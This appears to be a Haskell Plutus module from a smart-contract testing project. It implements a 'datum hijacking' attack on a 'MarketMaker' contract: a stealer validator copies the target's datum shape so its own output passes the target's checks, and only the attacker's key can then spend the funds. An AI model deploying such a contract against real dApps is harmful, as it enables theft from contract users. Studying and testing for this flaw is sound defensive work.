{-# LANGUAGE DataKinds #-}
{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DeriveGeneric #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE MultiParamTypeClasses #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE NoImplicitPrelude #-}

-- This module creates a simple "datum hijacking" example.
-- The "datum hijacking" attack consists in creating a contract
-- with the same structure of datum as the attacked contract.
-- Whenever one checks that an output has the expected datum,
-- since serialization only relies on the structure,
-- (serialized datums have the shape "Const 1 (int 24)")
-- it is possible to put an output of our own contract instead of a legitimate
-- output.
module MarketMaker.DatumHijacking where

import Data.Aeson (FromJSON, ToJSON)
import GHC.Generics (Generic)
import qualified Ledger
import qualified Ledger.Contexts as Contexts
import qualified Ledger.Typed.Scripts as Scripts
import qualified PlutusTx
import PlutusTx.Prelude hiding (Applicative (..))
import Schema (ToSchema)
import qualified Prelude as Haskell

newtype StealerParams = StealerParams
  { stealerPKH :: Ledger.PubKeyHash
  }
  deriving stock (Haskell.Show, Generic)
  deriving anyclass (ToJSON, FromJSON, ToSchema)

PlutusTx.makeLift ''StealerParams

-- Here we reproduce the shape of datum of the 'MarketMaker' contract,
-- so only one constructor, which takes one integer parameter.
newtype StealerDatum = StealerDatum
  {fake :: Integer}
  deriving stock (Haskell.Show)

type StealerRedeemer = ()

validateSteal :: StealerParams -> StealerDatum -> StealerRedeemer -> Contexts.ScriptContext -> Bool
validateSteal (StealerParams pkh) _ _ context =
  let info = Contexts.scriptContextTxInfo context
   in elem pkh (Contexts.txInfoSignatories info)

data Stealer

PlutusTx.makeLift ''StealerDatum
PlutusTx.unstableMakeIsData ''StealerDatum

instance Scripts.ValidatorTypes Stealer where
  type RedeemerType Stealer = StealerRedeemer
  type DatumType Stealer = StealerDatum

stealerValidator :: StealerParams -> Scripts.TypedValidator Stealer
stealerValidator =
  Scripts.mkTypedValidatorParam @Stealer
    $$(PlutusTx.compile [||validateSteal||])
    $$(PlutusTx.compile [||wrap||])
  where
    wrap = Scripts.wrapValidator @StealerDatum @StealerRedeemer
